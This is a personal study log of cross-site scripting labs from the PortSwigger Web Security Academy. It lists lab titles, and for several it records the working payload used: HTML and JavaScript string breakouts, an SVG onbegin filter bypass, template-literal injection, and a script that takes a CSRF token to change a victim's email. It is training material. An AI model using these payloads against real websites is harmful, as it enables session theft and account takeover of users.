# Cross-Site Scripting

## Apprentice
- Reflected XSS into HTML context with nothing encoded
- Stored XSS into HTML context with nothing encoded
- DOM XSS in document.write sink using source location.search
- DOM XSS in innerHTML sink using source location.search
- DOM XSS in jQuery anchor href attribute sink using location.search source
- DOM XSS in jQuery selector sink using a hashchange event
- Reflected XSS into attribute with angle brackets HTML-encoded
- Stored XSS into anchor href attribute with double quotes HTML-encoded
- Reflected XSS into a JavaScript string with angle brackets HTML encoded

## Practitioner
- DOM XSS in document.write sink using source location.search inside a select element
    - Inject malicious javascript into the storeId query parameter to escape from the string. URL: https://0ac0003b03854101851caa5f00c50027.web-security-academy.net/product?productId=1&storeId=%22%3E%3C/select%3E%3Cimg%20src=1%20onerror=alert(1)%3E
- DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
- Reflected DOM XSS
- Stored DOM XSS
- Reflected XSS into HTML context with most tags and attributes blocked
- Reflected XSS into HTML context with all tags blocked except custom ones
    - Used the Burp XSS cheat sheet payloads to determine that \<SVG> is not blocked, and in particular the
    \<animatetransform> tag. Used intruder to discover that the onbegin event is not blocked. Inserted the URL-encoded payload into the URL as the search query parameter: %22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E 
- Reflected XSS in canonical link tag
- Reflected XSS into a JavaScript string with single quote and backslash escaped
    - The search query payload is interpolated directly in a script. Break out of the string by using this payload: \</script><script>alert(1)</script>
- Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
    - Break out of the string using a backslash and single quote, since the backslash is not escaped. Payload: \'-alert();\\\
- Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
    - use \&apos; as the user's website to break out of the string and trigger alert. Payload: http://foo?&apos;-alert(1)-&apos;
- Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
    - Take advantage of the template literal to use string interpolation. Payload: ${alert()}
- Exploiting cross-site scripting to steal cookies
    - Uses the Burp Collaborator feature (professional) as an external server to send the cookie to. You can take advantage of the fact that HTML tags are not escaped to inject a script into the comment input.
- Exploiting XSS to bypass CSRF defenses
    - Take advantage of the lack of input validation in the comment input to inject a script which steals the csrf token and includes it in a request to change the user's email when the page loads --> account takeover. Payload: \<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>